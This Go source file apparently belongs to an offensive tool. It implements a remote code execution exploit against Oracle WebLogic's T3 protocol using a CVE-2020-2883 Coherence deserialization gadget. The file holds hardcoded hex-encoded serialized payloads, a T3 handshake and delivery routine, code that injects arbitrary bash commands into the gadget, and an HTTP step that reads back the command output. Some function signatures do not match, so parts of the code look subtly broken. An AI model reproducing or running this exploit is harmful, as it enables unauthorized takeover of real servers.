package weblogic

import (
	"context"
	"embed"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"
)

//go:embed payloads/java/*
var payloadFS embed.FS

const (
	t3Handshake = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n"

	t3Part1 = "000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371"

	evilPrefix = "056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000"

	evilSuffix = "fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff"
)

// Original embedded command in CC1 payload (56 bytes)
const origCmdOffset = 1168
const origCmdLen = 56
const origCmdLenPrefix = 0x0038 // 56

// ExploitT3 executes command via T3 deserialization and returns output
// Uses CVE-2020-2883 Coherence payload built from pre-compiled template
func ExploitT3(host string, port int, timeout time.Duration, cmd string) string {
	// Build payload from template (exec String[] form)
	payloadData := BuildRCEPayload(cmd)

	// Send via T3
	sendT3Exploit(host, port, timeout, payloadData)

	// Wait for command execution
	time.Sleep(5 * time.Second)

	// Try to read output via HTTP
	httpBase := fmt.Sprintf("http://%s:%d", host, port)
	for _, path := range []string{"/consolehelp/rce_out.txt", "/rce_out.txt"} {
		if out := tryHTTPRead(httpBase + path); out != "" {
			return out
		}
	}

	return ""
}

// buildCVE2020_2883Payload builds the Coherence deserialization payload
// Based on goPocs DoCve20202883
func buildCVE2020_2883Payload(cmd string) string {
	fullCmd := fmt.Sprintf("/bin/bash -c %s>/tmp/rce_out.txt", cmd)

	payloadStart := `aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2f56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174`

	payloadEnd := `74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178`

	// Insert command: 2-byte length + hex-encoded command
	cmdHex := hex.EncodeToString([]byte(fullCmd))
	cmdLenHex := fmt.Sprintf("%04x", len(fullCmd))

	return payloadStart + cmdLenHex + cmdHex + payloadEnd
}

// injectCommand replaces the embedded command in the CC1 serialized payload
func injectCommand(payload []byte, newCmd string) ([]byte, error) {
	result := make([]byte, len(payload))
	copy(result, payload)

	// New command as bytes
	cmdBytes := []byte(newCmd)
	cmdLen := len(cmdBytes)

	// The original string at offset origCmdOffset has:
	// - offset origCmdOffset-2: 2-byte big-endian length (origCmdLen = 56)
	// - offset origCmdOffset: origCmdLen bytes of command
	// We need to:
	// 1. Update the length prefix at origCmdOffset-2
	// 2. Replace the command bytes
	// 3. If new length differs, we need to adjust

	if cmdLen > origCmdLen {
		// Command too long - pad with extra shell args instead
		// Use a shorter format
		shortCmd := fmt.Sprintf("bash -c %q > /tmp/rce_out.txt", newCmd)
		cmdBytes = []byte(shortCmd)
		cmdLen = len(cmdBytes)
		if cmdLen > origCmdLen {
			return nil, fmt.Errorf("command too long: %d > %d", cmdLen, origCmdLen)
		}
	}

	// Write new length prefix (2 bytes big-endian)
	binary.BigEndian.PutUint16(result[origCmdOffset-2:origCmdOffset], uint16(cmdLen))

	// Write new command
	copy(result[origCmdOffset:origCmdOffset+cmdLen], cmdBytes)

	// If new command is shorter, pad remaining bytes with spaces
	// (the original payload had 56 bytes, extra bytes after our command
	//  will be ignored since we set the correct length)
	for i := origCmdOffset + cmdLen; i < origCmdOffset+origCmdLen; i++ {
		result[i] = 0x20 // space
	}

	return result, nil
}

// sendT3Exploit sends the T3 exploit and returns any response data
func sendT3Exploit(host string, port int, timeout time.Duration, payloadData []byte) string {
	if err := SendT3Payload(host, port, timeout, payloadData); err != nil {
		return ""
	}
	return "sent"
}

// SendT3Payload performs the WebLogic T3 handshake, registers the class table
// and delivers the serialized gadget inside the standard T3 message wrapper.
func SendT3Payload(host string, port int, timeout time.Duration, payloadData []byte) error {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	d := net.Dialer{}
	conn, err := d.DialContext(ctx, "tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Step 1: T3 handshake
	if _, err := conn.Write([]byte(t3Handshake)); err != nil {
		return err
	}
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n == 0 || !strings.Contains(string(buf[:n]), "HELO:") {
		return fmt.Errorf("not a WebLogic T3 service")
	}

	// Step 2: T3 class table registration
	t3p1, _ := hex.DecodeString(t3Part1)
	conn.Write(t3p1)
	time.Sleep(200 * time.Millisecond)

	t3p2Hex := fmt.Sprintf("007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000%04xffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07", port)
	t3p2, _ := hex.DecodeString(t3p2Hex)
	conn.Write(t3p2)
	time.Sleep(200 * time.Millisecond)

	p3, _ := hex.DecodeString("1a7727000d3234322e323134")
	conn.Write(p3)
	p4, _ := hex.DecodeString("2e312e32353461863d1d0000000078")
	conn.Write(p4)
	time.Sleep(300 * time.Millisecond)

	// Step 3: Build and send evil payload
	payloadHex := hex.EncodeToString(payloadData)
	evil := evilPrefix + payloadHex + evilSuffix
	totalLen := len(evil)/2 + 4
	fullMsg := make([]byte, 4)
	fullMsg[0] = byte(totalLen >> 24)
	fullMsg[1] = byte(totalLen >> 16)
	fullMsg[2] = byte(totalLen >> 8)
	fullMsg[3] = byte(totalLen)
	evilData, _ := hex.DecodeString(evil)
	fullMsg = append(fullMsg, evilData...)

	if _, err := conn.Write(fullMsg); err != nil {
		return err
	}
	time.Sleep(1 * time.Second)
	return nil
}

// tryHTTPRead tries to read a file via HTTP
func tryHTTPRead(url string) string {
	client := &http.Client{Transport: pickTransport(nil), Timeout: 3 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	s := strings.TrimSpace(string(body))
	if resp.StatusCode == 200 && s != "" && !strings.Contains(s, "<html") && !strings.Contains(s, "<HTML") {
		return s
	}
	return ""
}

// TestGadgets keeps for backward compatibility
func TestGadgets(host string, port int, timeout time.Duration, cmd string) string {
	return ExploitT3(host, port, timeout, cmd)
}
